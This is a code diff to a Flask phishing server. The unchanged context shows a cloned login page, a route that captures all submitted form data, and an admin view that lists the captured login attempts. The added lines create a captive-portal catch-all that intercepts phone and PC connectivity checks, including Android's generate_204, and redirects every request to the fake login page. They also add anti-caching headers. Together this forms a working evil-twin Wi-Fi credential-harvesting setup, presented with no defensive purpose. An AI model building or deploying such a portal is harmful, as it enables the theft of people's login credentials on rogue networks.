@@ -18,6 +18,19 @@ def index():
     # Serve the cloned page which now contains both HRD and Login views
     return render_template('index.html')
 
+# Catch-all route to handle captive portal checks (Android, iOS, Windows)
+@app.route('/<path:path>')
+def catch_all(path):
+    # Log what URL the device was trying to reach (useful for debugging)
+    print(f"Device tried to reach: {path}")
+    
+    # Android specific: generate_204 check
+    if path == 'generate_204':
+        return redirect(url_for('index'), code=302)
+        
+    # Redirect everything else to the login page
+    return redirect(url_for('index'), code=302)
+
 @app.route('/login', methods=['POST'])
 def login():
     # Capture all form data
@@ -101,6 +114,13 @@ def admin():
     </html>
     """
     return render_template_string(html, attempts=reversed(login_attempts))
+
+@app.after_request
+def add_header(response):
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '-1'
+    return response
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080, debug=True)
